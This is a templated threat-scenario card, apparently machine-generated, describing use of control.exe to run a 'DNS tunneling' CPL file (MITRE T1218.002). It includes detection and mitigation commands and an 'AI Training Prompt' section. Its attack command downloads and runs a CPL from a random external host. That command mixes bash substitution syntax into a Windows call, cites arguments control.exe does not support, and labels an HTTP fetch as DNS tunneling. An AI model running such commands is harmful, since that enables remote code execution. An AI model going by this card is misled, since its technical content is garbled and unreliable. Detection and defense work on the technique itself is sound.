---
type: campaign
scenario_id: 409
tactic: Defense Evasion
technique: "T1218.002: Control Panel"
technique_id: T1218.002
tags: [campaign, lotl, defense_evasion]
---

# Using control.exe to execute DNS tunneling CPL file.

## Threat Description
Using control.exe to execute DNS tunneling CPL file.

## Attack Command
```
control http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).cpl) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor control HTTP: `wmic process where name='control.exe' get commandline | findstr http`; YARA rule: `rule ControlDnsTunnel { strings: $a = /control.*http.*cpl/ nocase; condition: $a }`.

## Mitigation
Restrict control: `icacls %windir%\System32\control.exe /deny Everyone:RX`; Block CPL downloads: `netsh advfirewall firewall add rule name='Block control' dir=out program='%windir%\System32\control.exe' action=block`.

## AI Training Prompt
Train AI to detect control.exe-based DNS tunneling CPL execution by analyzing HTTP downloads, control command-line arguments, and DNS query patterns; suggest CPL download restrictions.

## References
- MITRE ATT&CK T1218.002: https://attack.mitre.org/techniques/T1218/002/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
